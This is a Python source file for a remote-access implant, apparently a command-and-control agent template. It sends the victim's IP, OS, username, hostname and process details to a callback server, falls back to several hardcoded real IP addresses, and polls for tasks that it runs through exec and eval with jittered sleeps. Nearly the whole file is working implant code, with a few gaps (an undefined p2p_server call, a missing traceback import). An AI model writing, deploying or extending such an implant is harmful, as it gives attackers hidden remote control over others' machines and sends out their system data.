#!/usr/bin/python3

import json
import base64
import requests
import time
import ast
import types
import math
import random
import socket
import struct
import platform
import os
import getpass


# Global dict containing name and code of the dynamic functions loaded 

global dynfs
global result
global sudo
dynfs = {}
sudo = ""
responses = []
delegates = []
delegates_address = []
delegates_UUID = []
delegates_aswers = []
result = {}

# my ip 87.3.200.118
# linode 194.195.242.157
# linode 172.104.135.23
# linode 172.104.135.67

class Agent:
    Server = "callback_host"
    Port = "callback_port"
    URI = "/post_uri"
    PayloadUUID = "UUID_HERE"
    UUID = ""
    UserAgent = {"User-Agent"}
    HostHeader = "domain_front"
    Sleep = "callback_interval"
    Jitter = "callback_jitter"
    KillDate = "killdate"
    Script = ""


def agent_encoder(agent):
    if isinstance(agent, Agent):
        return {
            'Server': agent.Server,
            'Port': agent.Port,
            'URI': agent.URI,
            'PayloadUUID': agent.PayloadUUID,
            'UUID': agent.UUID,
            'UserAgent': agent.UserAgent,
            'HostHeader': agent.HostHeader,
            'Sleep': agent.Sleep,
            'Jitter': agent.Jitter,
            'KillDate': agent.KillDate,
            'Script': agent.Script,
        }
   

def to64(data):
    serialized = data.encode('utf-8')
    base64_bytes = base64.b64encode(serialized)
    return base64_bytes.decode('utf-8')

def from64(data):
    response_bytes = data.encode('utf-8')
    response_decode = base64.b64decode(response_bytes)
    response_message = response_decode.decode('utf-8')
    return ast.literal_eval(response_message[36:])


def getIP():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]


def checkin(agent):

    print("[+] CHECKIN")

    checkin_data = {    
        "action": "checkin",
        "ip": getIP(),
        "os": platform.system() + " " + platform.release(),
        "user": getpass.getuser(),
        "host": socket.gethostname(),
        "domain": socket.getfqdn(),
        "pid": os.getpid(),
        "uuid": agent.PayloadUUID,
        "architecture": platform.architecture(),
        }
    serialized = json.dumps(checkin_data)

    message = to64(serialized)
    uuid = to64(agent.PayloadUUID)
    
    x = ""
    try:
        x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = uuid + message, headers=agent.UserAgent)
    except:
        try:
            print("[P2P server not found. Switching to 194.195.242.157]")
            agent.Server = "http://194.195.242.157"
            agent.Port = "9090"
            x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = uuid + message, headers=agent.UserAgent)
        except:
            print("[P2P server not found. Switching to main server]")
            agent.Server = "http://87.3.200.118"
            agent.Port = "80"
            x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = uuid + message, headers=agent.UserAgent)
    res = from64(x.text)

    agent.UUID = res['id']


def get_tasks():

    tasks = {
        'action': "get_tasking",
        'tasking_size': -1
    }
    serialized = json.dumps(tasks)

    message = to64(serialized)
    uuid = to64(agent.UUID)

    x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = uuid + message, headers=agent.UserAgent)

    task_list = from64(x.text)

    if task_list:
        if task_list["tasks"]:
            print("[+] New Tasks")
            print("\t" + str(task_list))
    
    
    if "delegates" in task_list:
        for m in task_list["delegates"]:
            delegates_aswers.append(m)

    return task_list




def reverse_upload(task_id, file_id):
    upload = {
        'action': "upload",
        'file_id': file_id,
        'chunk_size': 512000,
        'chunk_num': 1,
        'full_path': "",
        'task_id': task_id,
    }
    serialized = json.dumps(upload)

    message = to64(serialized)
    uuid = to64(agent.PayloadUUID)

    x = requests.post(agent.Server + agent.URI, data = uuid + message, headers=agent.UserAgent)
    
    res = from64(x.text)
    res = res['chunk_data']

    response_bytes = res.encode('utf-8')
    response_decode = base64.b64decode(response_bytes)
    code = response_decode.decode('utf-8')

    return code


def post_result():
    global responses
    global delegates
    global delegates_aswers

    response = {}
    if delegates:
        response = {
            'action': "post_response",
            'responses': responses,
            'delegates': delegates
        }
        responses = []
        delegates = []
        
    else:
        response = {
            'action': "post_response",
            'responses': responses
        }
        responses = []

    serialized = json.dumps(response)
    message = to64(serialized)
    uuid = to64(agent.UUID)

    x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = uuid + message, headers=agent.UserAgent)

    result = from64(x.text)

    if "delegates" in result:
        for m in result["delegates"]:
            delegates_aswers.append(m)

    return result


def execute_tasks(tasks):
    if tasks:
        for task in tasks['tasks']:
            execute(task)

    r = random.randint(0,1)
    if r < 0.5:
        r = -1
    else:
        r = 1

    sleep_time = int(agent.Sleep) + r*(int(agent.Sleep) * int(agent.Jitter) / 100)

    time.sleep(sleep_time / 5)

    post_result()



def execute(task):

    # Search in the dynamic functions first, so a command can be sobstituted through the load functionality
    function = str(task['command'])
    print("\n[+] EXECUTING " + function)

    found = False

    param_list = "task['id'],"
    if task['parameters'] != '' and task['parameters'][0] == "{":
        parameters = ast.literal_eval(task['parameters'])
        for param in parameters:
            param_list += "ast.literal_eval(task['parameters'])['" + param + "'],"
    else:
        if task['parameters'] != '':
            param_list += "task['parameters'],"



    param_list = param_list[:-1]

    for item in dynfs:
        
        if item == function:
            try:
                exec(dynfs[item])
                eval(function + "(" + str(param_list) + ")")
                found = True
            except Exception as e:
                print(traceback.format_exc())
                response = {
                        'task_id': task['id'],
                        "user_output": str(e),
                        'completed': False,
                        'status': 'error'
                    }
                responses.append(response)
    
    if found == False:
        try:
            eval(function + "(" + str(param_list) + ")")
        except Exception as e:
            print(traceback.format_exc())
            response = {
                    'task_id': task['id'],
                    "user_output": str(e),
                    'completed': False,
                    'status': 'error'
                }
            responses.append(response)




################################################################################################################

# The comment below will be sobstituted by the definition of the functions imported at creation time

# FUNCTIONS



################################################################################################################


# MAIN LOOP

agent = Agent()

uuid_file = "UUID.txt"

if os.path.isfile(uuid_file):
    # f = open(uuid_file, "r")
    # agent.UUID = f.read()
    pass

else:
    checkin(agent)
    print("\t UUID = " + agent.UUID)
    # f = open(uuid_file, "w")
    # f.write(agent.UUID)
    # f.close()

    ip = requests.get('https://api.ipify.org').text
    print(ip)
    if ip == "194.195.242.157" or ip == "172.104.135.23" or ip == "172.104.135.67":
        print("[+] P2P Server")
        p2p_server(1)

while True:

    tasks = get_tasks()

    execute_tasks(tasks)

    r = random.randint(0,1)
    if r < 0.5:
        r = -1
    else:
        r = 1

    sleep_time = int(agent.Sleep) + r*(int(agent.Sleep) * int(agent.Jitter) / 100)

    sleep_time = random.randint(0, int(sleep_time))

    # print("[SLEEPING " + str(sleep_time) + "]")
    time.sleep(sleep_time / 5)


